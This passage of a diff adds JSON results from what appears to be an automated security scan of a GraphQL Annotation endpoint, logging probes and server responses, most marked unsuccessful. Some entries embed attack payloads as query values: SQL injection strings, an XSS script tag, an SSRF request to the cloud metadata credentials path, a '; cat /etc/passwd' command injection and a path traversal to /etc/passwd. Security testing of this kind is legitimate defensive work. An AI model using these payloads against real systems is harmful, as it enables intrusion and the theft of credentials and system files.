+  },
+  {
+    "query": {
+      "query": "\nquery BypassAnnotation {\n  aliasedAnnotation: Annotation(id: \"annotation_bypass_aliased\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.097,
+        "timestamp": "2025-09-29T08:16:22.349823Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.082,
+        "timestamp": "2025-09-29T08:16:22.432344Z",
+        "response_body": {
+          "data": {
+            "aliasedAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 42,
+    "timestamp": "2025-09-29T08:16:22.432381Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.102,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.114,
+    "timestamp": "2025-09-29T08:16:25.089272Z",
+    "count": 43,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/types]) : Field 'types' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_suggest\") {\n    id\n    typ\n    bod\n    annotatinType\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.095,
+    "timestamp": "2025-09-29T08:16:27.379945Z",
+    "count": 44,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typ]) : Field 'typ' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/bod]) : Field 'bod' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/annotatinType]) : Field 'annotatinType' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 7,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"anno_001\") {\n    id\n    type\n    body\n    field\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T08:16:49.017802Z",
+    "count": 45,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation_sql_injection' OR '1'='1\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.106,
+    "timestamp": "2025-09-29T08:16:51.279917Z",
+    "count": 46,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"anno_xss\") {\n    id\n    type\n    body\n    field\n    by\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.101,
+    "timestamp": "2025-09-29T08:16:53.456787Z",
+    "count": 47,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"anno_ssrf\") {\n    id\n    type\n    body\n    field\n    by\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.088,
+    "timestamp": "2025-09-29T08:16:55.886665Z",
+    "count": 48,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"anno_cmd\") {\n    id\n    type\n    body\n    field\n    by\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.114,
+    "timestamp": "2025-09-29T08:16:58.576473Z",
+    "count": 49,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"anno_path\") {\n    id\n    type\n    body\n    field\n    by\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.096,
+    "timestamp": "2025-09-29T08:17:00.785089Z",
+    "count": 50,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"anno_html\") {\n    id\n    type\n    body\n    field\n    by\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.128,
+    "timestamp": "2025-09-29T08:17:02.800597Z",
+    "count": 51,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"bypass_non_aliased_007\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.084,
+        "timestamp": "2025-09-29T08:17:05.591934Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.105,
+        "timestamp": "2025-09-29T08:17:05.696920Z",
+        "response_body": {
+          "data": {
+            "aliasedAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 52,
+    "timestamp": "2025-09-29T08:17:05.696991Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.095,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  aliasedAnnotation: Annotation(id: \"bypass_aliased_007\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.087,
+        "timestamp": "2025-09-29T08:17:08.181076Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.091,
+        "timestamp": "2025-09-29T08:17:08.272866Z",
+        "response_body": {
+          "data": {
+            "aliasedAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 53,
+    "timestamp": "2025-09-29T08:17:08.272903Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.08,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"introspection_test_id\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.082,
+    "timestamp": "2025-09-29T08:17:11.122267Z",
+    "count": 54,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"suggestion_test_id\") {\n    id\n    type\n    body\n    field\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T08:17:13.969887Z",
+    "count": 55,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4a\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.095,
+    "timestamp": "2025-09-29T08:17:33.241666Z",
+    "count": 56,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4a\" WHERE 1=1 --\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.112,
+    "timestamp": "2025-09-29T08:17:36.021578Z",
+    "count": 57,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Invalid Syntax : offending token '1' at line 3 column 63",
+          "locations": [
+            {
+              "line": 3,
+              "column": 63
+            }
+          ],
+          "extensions": {
+            "classification": "InvalidSyntax"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4b\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.091,
+        "timestamp": "2025-09-29T08:17:38.622702Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.143,
+        "timestamp": "2025-09-29T08:17:38.765407Z",
+        "response_body": {
+          "data": {
+            "aliasAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 58,
+    "timestamp": "2025-09-29T08:17:38.765439Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.088,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery AnnotationAlias {\n  aliasAnnotation: Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4b\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.1,
+        "timestamp": "2025-09-29T08:17:41.626286Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.092,
+        "timestamp": "2025-09-29T08:17:41.719076Z",
+        "response_body": {
+          "data": {
+            "aliasAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 59,
+    "timestamp": "2025-09-29T08:17:41.719114Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.09,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T08:17:44.204073Z",
+    "count": 60,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/types]) : Field 'types' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4c\") {\n    id\n    typ # Should suggest 'type'\n    bod # Should suggest 'body'\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.093,
+    "timestamp": "2025-09-29T08:17:46.689018Z",
+    "count": 61,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typ]) : Field 'typ' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/bod]) : Field 'bod' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4a\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.088,
+    "timestamp": "2025-09-29T08:18:00.001368Z",
+    "count": 62,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4a' OR '1'='1\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.104,
+    "timestamp": "2025-09-29T08:18:01.766618Z",
+    "count": 63,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"<script>alert('XSS')</script>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.108,
+    "timestamp": "2025-09-29T08:18:04.274632Z",
+    "count": 64,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.1,
+    "timestamp": "2025-09-29T08:18:06.541932Z",
+    "count": 65,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4a; cat /etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.1,
+    "timestamp": "2025-09-29T08:18:08.508275Z",
+    "count": 66,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"../../../etc/passwd\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.091,
+    "timestamp": "2025-09-29T08:18:10.975407Z",
+    "count": 67,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"<h1>Important Notice</h1><p>Please read this carefully.</p>\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.098,
+    "timestamp": "2025-09-29T08:18:12.830226Z",
+    "count": 68,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery AnnotationAlias {\n  alias: Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4a\") {\n    id\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.088,
+        "timestamp": "2025-09-29T08:18:14.469185Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.09,
+        "timestamp": "2025-09-29T08:18:14.559792Z",
+        "response_body": {
+          "data": {
+            "alias": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 69,
+    "timestamp": "2025-09-29T08:18:14.559850Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.092,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery IntrospectionQuery {\n  Annotation {\n    queryType {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.087,
+    "timestamp": "2025-09-29T08:18:17.580088Z",
+    "count": 70,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/queryType]) : Field 'queryType' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"c8e7b4a1-8d2f-4e3c-8a0b-9f1d0e2c3b4a\") {\n    id\n    typo\n    descripxion\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.097,
+    "timestamp": "2025-09-29T08:18:20.141736Z",
+    "count": 71,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/typo]) : Field 'typo' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/descripxion]) : Field 'descripxion' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:1\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.082,
+    "timestamp": "2025-09-29T08:18:36.918932Z",
+    "count": 72,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:1' OR '1'='1' --\") {\n    id\n    type\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.099,
+    "timestamp": "2025-09-29T08:18:39.914816Z",
+    "count": 73,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:2\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.088,
+    "timestamp": "2025-09-29T08:18:42.993106Z",
+    "count": 74,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:3\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.094,
+    "timestamp": "2025-09-29T08:18:45.641685Z",
+    "count": 75,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:4\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.101,
+    "timestamp": "2025-09-29T08:18:48.387368Z",
+    "count": 76,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:5\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.103,
+    "timestamp": "2025-09-29T08:18:51.478491Z",
+    "count": 77,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:6\") {\n    id\n    type\n    body\n    field\n    annotationType\n    by\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.089,
+    "timestamp": "2025-09-29T08:18:54.365233Z",
+    "count": 78,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "Annotation": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation(id: \"annotation:7\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.088,
+        "timestamp": "2025-09-29T08:18:56.947075Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.085,
+        "timestamp": "2025-09-29T08:18:57.031999Z",
+        "response_body": {
+          "data": {
+            "aliasedAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 79,
+    "timestamp": "2025-09-29T08:18:57.032078Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.09,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery BypassAnnotation {\n  aliasedAnnotation: Annotation(id: \"annotation:8\") {\n    id\n    type\n    body\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.086,
+        "timestamp": "2025-09-29T08:19:00.118283Z",
+        "response_body": {
+          "data": {
+            "Annotation": null
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.09,
+        "timestamp": "2025-09-29T08:19:00.208481Z",
+        "response_body": {
+          "data": {
+            "aliasedAnnotation": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 80,
+    "timestamp": "2025-09-29T08:19:00.208563Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.141,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Validation error (FieldUndefined@[episodesByIds]) : Field 'episodesByIds' in type 'Root' is undefined",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  Annotation {\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.1,
+    "timestamp": "2025-09-29T08:19:02.202331Z",
+    "count": 81,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Validation error (MissingFieldArgument@[Annotation]) : Missing field argument 'id'",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        },
+        {
+          "message": "Validation error (FieldUndefined@[Annotation/types]) : Field 'types' in type 'Annotation' is undefined",
+          "locations": [
+            {
+              "line": 4,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "classification": "ValidationError"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
